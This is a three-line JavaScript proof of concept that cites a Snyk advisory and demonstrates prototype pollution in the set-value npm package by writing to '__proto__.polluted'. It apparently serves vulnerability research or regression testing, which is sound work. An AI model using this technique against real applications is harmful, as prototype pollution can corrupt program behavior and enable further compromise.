//https://snyk.io/vuln/SNYK-JS-SETVALUE-450213
const setFn = require('set-value');
setFn({}, '__proto__.polluted', "yes");
